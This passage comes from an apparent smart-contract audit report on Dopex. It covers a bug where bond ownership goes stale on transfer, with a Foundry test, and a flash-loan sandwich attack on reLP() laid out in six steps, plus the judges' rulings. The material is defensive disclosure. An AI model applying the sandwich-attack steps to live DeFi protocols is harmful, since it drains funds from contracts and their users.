href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1030\">[M-07] The owner of RPDX Decaying Bonds is not updated on token transfers</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1030\">juancito</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1349\">glcanvas</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1138\">Yanchuan</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/532\">volodya</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L36-L44\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L36-L44</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L122\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L122</a></p>\n<p>The <code>RdpxDecayingBonds</code> contract keeps track of a <code>bonds</code> mapping with bonds information including the bond token owner. When the token is transfered, the <code>bonds[bondId].owner</code> value should be updated, but it isn’t.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The <code>owner</code> value will be bricked when a token is transfered, as it can’t be changed by any means.</p>\n<p>Any integration relying on this value will make wrong trusted assumptions related to the bond token owner, potentially leading to critical issues as loss of funds, because of the importance of the <code>owner</code> attribute has.</p>\n<p>Ranking it as Medium, as there is no direct loss of funds within the current scope, but bricks the contract functionality, as there is no way to fix it.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>owner</code> attribute of the <code>bonds</code> mapping is set on each <code>mint()</code>, but its value is never updated:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Array of bonds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Bond</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bonds</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Structure to store the bond information</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Bond</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expiry</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L36-L44\">RdpxDecayingBonds.sol#L36-L44</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expiry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">hasRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Caller is not a minter&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_mintToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk12\">bonds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bondId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Bond</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">expiry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BondMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bondId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">expiry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L122\">RdpxDecayingBonds.sol#L122</a></p>\n<h3 id=\"coded-proof-of-concept\" style=\"position:relative;\"><a href=\"#coded-proof-of-concept\" aria-label=\"coded proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Coded Proof of Concept</h3>\n<p>This test shows how the <code>owner</code> remains the same on the <code>bonds</code> transfer after performing a transfer.</p>\n<p>Add this test to the <code>tests/RdpxDecayingBondsTest.t.sol</code> file, and run <code>forge test --mt \"testSameOwnerOnTransfer\"</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSameOwnerOnTransfer</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Mint a token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1223322</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The tokenId is 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// This can be confirmed by the fact that it changes its `ownerOf()` result on the OZ ERC721 after the transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check the bond token owner before the transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check for both via the `bonds` mapping, and the OZ `ownerOf()` function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ownerBeforeTransfer</span><span class=\"mtk1\">,,) = </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bonds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerBeforeTransfer</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Transfer token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">420</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The `owner` changes on the OZ `ownerOf` function, while it remains the same on the `bonds` mapping</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ownerAfterTransfer</span><span class=\"mtk1\">,,) = </span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bonds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerAfterTransfer</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));                        </span><span class=\"mtk3\">// @audit remains the same after the transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">420</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Either update the <code>owner</code> value on each token transfer, or remove it, as the owner of the token is already tracked via the OZ ERC721 contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1030#issuecomment-1734120024\">psytama (Dopex) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1030#issuecomment-1759301770\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The finding lacks a clear loss of funds, although that may be possible since <code>ownerOf</code> is used for internal checks.</p>\n<p>The code breaks the implementation of EIP721, and may also cause losses + issues with integrations.</p>\n<p>I think Medium Severity is appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-relpcontractrelp-is-susceptible-to-sandwich-attack-due-to-user-control-over-bond\" style=\"position:relative;\"><a href=\"#m-08-relpcontractrelp-is-susceptible-to-sandwich-attack-due-to-user-control-over-bond\" aria-label=\"m 08 relpcontractrelp is susceptible to sandwich attack due to user control over bond permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976\">[M-08] <code>reLPContract.reLP()</code> is susceptible to sandwich attack due to user control over <code>bond()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976\">peakbolt</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L873\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L873</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L930\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L930</a></p>\n<p><code>RdpxV2Core.bond()</code> calls <code>reLPContract.reLP()</code> at the end of the bonding to adjust the LP for the rDPX/ETH pool and swap ETH for rDPX.\nWithin <code>reLPContract.reLP()</code>, it first calls <code>removeLiquidity()</code> to remove liquidity (rDPX and ETH), followed by <code>swapExactTokensForTokens()</code> and <code>addLiquidity()</code>.</p>\n<p>However, the issue is that an attacker has control over <code>RdpxV2Core.bond()</code> and can use it to indirectly call <code>reLPContract.reLP()</code>. That means the attacker can basically frontrunned/backrunned <code>reLP()</code> without a mempool. It also reduces the attack cost as attacker does not pay high gas to frontrun it.</p>\n<p>One may argue that the slippage protection is in place, but that only makes it less profitable and would not help in this case because the attacker is able to increase the trade size of the UniswapV2 transactions. That is because the attacker can adjust the bonding amount to increase the amount of liquidity removed by <code>reLP()</code> (and also swap/add liquidity), allowing the attacker to craft a profitable sandwich attack.</p>\n<p>It is not recommended to allow users to have indirect control over the UniswapV2 transaction in <code>reLPContract</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L873\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L873</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//@audit an attacker can indirectly trigger this to perform a large trade and sandwich attack it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// reLP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isReLPActive</span><span class=\"mtk1\">) </span><span class=\"mtk11\">IReLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reLPContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">reLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>An attacker can steal from <code>rdpxV2Core</code> by crafting an profitable sandwich attack on <code>bond()</code>.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>An attacker can perform a sandwich attack as follows:</p>\n<ol>\n<li>Perform a flash loan to borrow ETH.</li>\n<li>Use the borrowed ETH to perform a ETH-to-rDPX swap on the UniswapV2 rDPX/ETH pool. This is to increase the price of rDPX before <code>reLPContract.reLP()</code>.</li>\n<li>Call <code>rdpxV2Core.bond()</code> to indirectly trigger <code>reLPContract.reLP()</code>, which will <code>removeLiquidity()</code>, causing it receive lesser rDPX due to the price manipulation.</li>\n<li><code>reLPContract.reLP()</code> will then <code>swapExactTokensForTokens()</code> to swap ETH-to-rDPX using ETH from removed liquidity. This further increase price of rDPX.</li>\n<li><code>addLiquidity()</code> is then called by <code>reLPContract.reLP()</code> to return part of the liquidity into the pool.</li>\n<li>Attacker now swap rDPX back to ETH to realize profit from the attack and pay back the flash loan.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove <code>reLPContract.ReLP()</code> from <code>bond()</code> and trigger separately to prevent user access to it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1733781720\">psytama (Dopex) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>The re-LP contract and process will be modified.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1759437289\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>I would have liked to see a Coded POC.</p>\n<p>Removing Liquidity is not as simple to exploit as swap.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1763994630\">Alex the Entreprenerd (Judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>UniV2 Code is as follows:<br>\n<a href=\"https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L144-L155\">https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L144-L155</a></p>\n<p>Offering Pro Rata Distribution</p>\n<p>In lack of a coded POC</p>\n<p>The maximum skimmable is the delta excess value in the UniV2 Reserves vs the value that the caller has to pay to imbalance them.</p>\n<p>The cost of imbalancing and the nature of it + the fact that other people would have ownership of the LP token means that profitability is dependent on those factors, which IMO have not been properly factored in.</p>\n<p>In the presence of a Coded POC as part of the original submission, I would have considered a High Severity.</p>\n<p>In lack of it, Medium Severity for Skimming the excess value seems more appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/976#issuecomment-1774193810\">peakbolt (Warden) commented</a>:</strong></p>\n<blockquote>\n<p>Hi @Alex the Entreprenerd, </p>\n<p>I understand your judgement as you have raised valid points, though the circumstances here are different (explained below), which make it more profitable as compared to a typical sandwich attack on removeLiquidity().</p>\n<p><strong>1. Coded POC</strong><br>\nBelow is the printout from the POC, which shows it is more than just skimming of excess value (profit of 42.79 ETH using 1000 ETH flash loan vs minimal cost in point 2 below).\nFor your reference, I have uploaded it <a 